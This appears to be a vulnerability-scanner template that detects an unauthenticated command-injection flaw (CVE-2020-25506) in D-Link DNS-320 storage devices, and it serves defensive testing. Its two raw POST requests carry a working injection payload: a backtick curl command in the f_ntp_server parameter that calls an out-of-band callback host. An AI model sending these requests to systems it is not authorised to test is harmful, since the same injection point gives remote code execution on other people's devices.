id: CVE-2020-25506
info:
  name: D-Link DNS-320 - Unauthenticated Remote Code Execution
  author: gy741
  severity: critical
  description: D-Link DNS-320 FW v2.06B01 Revision Ax is vulnerable to remote code
    execution through unauthenticated command injection in the system_mgr.cgi component.
  reference:
  - https://gist.github.com/WinMin/6f63fd1ae95977e0e2d49bd4b5f00675
  - https://unit42.paloaltonetworks.com/mirai-variant-iot-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-25506
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-25506
    cwe-id: CWE-78
  tags: cve,cve2020,dlink,rce,oast,mirai,unauth,router,kev
  metadata:
    impact: The CVE-2020-25506 vulnerability in D-Link DNS-320 FW v2.06B01 Revision
      Ax allows remote attackers to execute arbitrary code through unauthenticated
      use of an HTTP parameter, potentially leading to significant impact on the affected
      system.
    recommendation: Ensure that the D-Link DNS-320 FW v2.06B01 Revision Ax is updated
      to the latest version and that the system_mgr.cgi component is properly sanitized
      to prevent the execution of arbitrary commands.
variables:
  useragent: '{{rand_base(6)}}'
requests:
- raw:
  - 'POST /cgi-bin/system_mgr.cgi? HTTP/1.1

    Host: {{Hostname}}

    Accept: */*


    C1=ON&cmd=cgi_ntp_time&f_ntp_server=`curl http://{{interactsh-url}} -H ''User-Agent:
    {{useragent}}''`

    '
  - 'POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`curl http://{{interactsh-url}}
    -H ''User-Agent: {{useragent}}''` HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: word
    part: interactsh_request
    words:
    - 'User-Agent: {{useragent}}'
